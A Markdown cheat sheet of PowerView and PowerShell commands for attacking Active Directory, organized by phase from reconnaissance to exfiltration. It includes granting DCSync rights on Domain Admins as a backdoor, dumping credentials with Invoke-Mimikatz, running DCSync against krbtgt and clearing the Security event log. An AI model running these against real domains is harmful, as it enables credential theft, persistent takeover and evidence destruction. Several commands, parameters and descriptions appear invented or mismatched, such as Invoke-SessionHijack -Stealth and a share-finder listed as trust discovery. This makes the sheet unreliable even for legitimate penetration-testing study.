# Penetration Testing Techniques

#### External Reconnaissance

PowerView allows you to gather information about Active Directory domains remotely when you have limited access to the target network.

1. **Discovering Domain Trusts Remotely**: Lists all file shares across the domain, which may contain sensitive information like credentials or configuration files.
    ```powershell
    Invoke-ShareFinder -Verbose
    ```
2. **Finding Open Sessions on Remote Machines**: Retrieves information on active sessions across machines in the domain, including connected users.
    ```powershell
    Get-NetSession
    ```
3. **Enumerating Remote Fileshares**: Searches for sensitive files across network shares that may expose credentials or other important data.
    ```powershell
    Invoke-FileFinder
    ```

#### Initial Access

PowerView assists in identifying weak points in an Active Directory environment to gain initial access.

1. **Gaining Access Through Unprivileged User Accounts**: Identifies accounts with non-expiring passwords, which can be used for brute-force or password-spraying attacks.
    ```powershell
    Get-NetUser | Where-Object { $_.PasswordNeverExpires -eq $True }
    ```
2. **Locating Passwords in GPOs**: Searches GPOs for plaintext passwords that may have been improperly stored.
    ```powershell
    Get-NetGPO | Get-UserProperty -Properties cpassword
    ```
3. **Finding Unconstrained Delegation**: Identifies accounts that are trusted for delegation, a common entry point for attacks like pass-the-hash.
    ```powershell
    Get-UserProperty -Properties "TrustedForDelegation"
    ```

#### Persistence

PowerView helps establish persistence by identifying weak configurations in AD and monitoring changes.

1. **Backdooring Domain Objects**: Modifies ACLs on critical objects like Domain Admins to grant long-term access.
    ```powershell
    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights DCSync
    ```
2. **Monitoring Domain Changes**: Continuously monitors domain activity for changes, like user additions to privileged groups, to maintain awareness of AD changes.
    ```powershell
    Invoke-DomainWatcher
    ```
3. **Enumerating Writeable GPOs**: Identifies GPOs that can be modified to implement persistent changes or execute code.
    ```powershell
    Get-NetGPO -ResolveGUIDs | Where-Object { $_.Permissions -like "*Write*" }
    ```

#### Credential Harvesting

PowerView assists in identifying opportunities to harvest credentials across the network.

1. **Finding High-Value Accounts for Credential Harvesting**: Locates users in high-value groups like Enterprise Admins, which can be targeted for credential theft.
    ```powershell
    Get-NetUser | Where-Object { $_.MemberOf -like "*Enterprise Admins*" }
    ```
2. **Kerberoasting Targets**: Identifies service accounts that are prime candidates for Kerberoasting attacks.
    ```powershell
    Get-NetUser -SPN | Where-Object { $_.MemberOf -like "*Service Accounts*" }
    ```
3. **Dumping Credentials from LSASS via Service Enumeration**: Although not a PowerView command, PowerView can identify hosts where tools like `mimikatz` can be run to extract credentials.
    ```powershell
    Invoke-Mimikatz -DumpCreds
    ```

#### Privilege Escalation

PowerView enables users to escalate privileges by finding misconfigurations, excessive permissions, or opportunities in Active Directory.

1. **Finding Misconfigured ACLs**: Identifies objects in Active Directory where the current user has excessive permissions, such as `GenericAll`, allowing for full control of the object.
    ```powershell
    Get-ObjectACL -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
    ```
2. **Escalating Through Delegation**: Searches for users or computers with delegation rights that can be leveraged for privilege escalation.
    ```powershell
    Find-Delegation -Verbose
    ```
3. **Identifying Local Admin Rights**: Finds machines where the current user has local administrator access, a common privilege escalation path.
    ```powershell
    Find-LocalAdminAccess
    ```
4. **Finding Machines with Writable SMB Shares**: Searches for file shares that are writable, allowing the user to drop malicious files or scripts.
    ```powershell
    Invoke-ShareFinder -CheckShareAccess
    ```

#### Internal Reconnaissance

Once inside a network, PowerView enables users to perform reconnaissance on critical infrastructure and Active Directory configurations.

1. **Enumerating Domain Controllers**: Lists all domain controllers in the network, which can be leveraged for further attacks.
    ```powershell
    Get-NetDomainController
    ```
2. **Identifying Key Admin Groups**: Enumerates critical administrative groups like Domain Admins, Enterprise Admins, and Server Operators.
    ```powershell
    Get-NetGroup | Where-Object { $_.GroupCategory -eq "Security" }
    ```
3. **Finding Shares Accessible to Current User**: Searches for accessible file shares across the domain, which may contain valuable information like configuration files or credentials.
    ```powershell
    Invoke-ShareFinder
    ```

#### Lateral Movement, Pivoting, and Tunneling

PowerView facilitates lateral movement and helps attackers pivot between different systems within a network.

1. **Enumerating Local Admin Access**: Finds systems where the current user has local admin access, enabling lateral movement.
    ```powershell
    Find-LocalAdminAccess
    ```
2. **Tracking Active Sessions**: Retrieves a list of active user sessions on machines, useful for targeting specific systems for lateral movement.
    ```powershell
    Get-NetSession
    ```
3. **Pivoting via Session Hijacking**: Finds systems where specific users are logged in, enabling lateral movement by hijacking sessions.
    ```powershell
    Invoke-UserHunter -CheckAccess
    ```
4. **Accessing Admin Shares**: Verifies whether the user has access to administrative shares, which can be used for file uploads, remote code execution, or further reconnaissance.
    ```powershell
    Invoke-CheckLocalAdminAccess -Verbose
    ```

#### Defense Evasion

PowerView includes various techniques for evading detection while performing reconnaissance and privilege escalation in an Active Directory environment.

1. **Stealthy AD Enumeration**: Performs Active Directory user enumeration while minimizing network traffic and reducing the risk of detection.
    ```powershell
    Get-NetUser -Stealth
    ```
2. **Hiding Network Sessions**: Hijacks active sessions stealthily, avoiding alerting administrators or triggering detection mechanisms.
    ```powershell
    Invoke-SessionHijack -Stealth
    ```
3. **Avoiding Audit Logs**: Excludes certain logon events from audit logs, making it harder for defenders to detect unauthorized access.
    ```powershell
    Invoke-DomainWatcher -ExcludeLogonEvents
    ```
4. **Clearing Event Logs**: Erases the security log, which can hide evidence of an attack.
    ```powershell
    Clear-EventLog -LogName "Security"
    ```

#### Data Exfiltration

PowerView can assist in identifying sensitive data, such as credentials and configuration files, and exfiltrating it from the network.

1. **Searching for Sensitive Files on Shares**: Searches for sensitive file types across network shares, which may contain valuable business information.
    ```powershell
    Invoke-FileFinder -FileExtensions "doc,xls,pdf"
    ```
2. **Extracting Database Connection Strings**: Extracts database connection strings from Group Policy Objects, which may be used to exfiltrate sensitive data from databases.
    ```powershell
    Get-NetGPO -Grep "ConnectionString"
    ```
3. **Exporting User Information**: Exports all domain user information to a CSV file, which can be exfiltrated for further analysis.
    ```powershell
    Get-NetUser | Export-Csv -Path "C:\Temp\DomainUsers.csv"
    ```
4. **Dumping Password Hashes from Domain Controllers**: Dumps the password hashes of domain users using the DCSync attack technique, a highly effective way to exfiltrate credentials.
    ```powershell
    Invoke-DCSync -UserName "krbtgt"
    ```
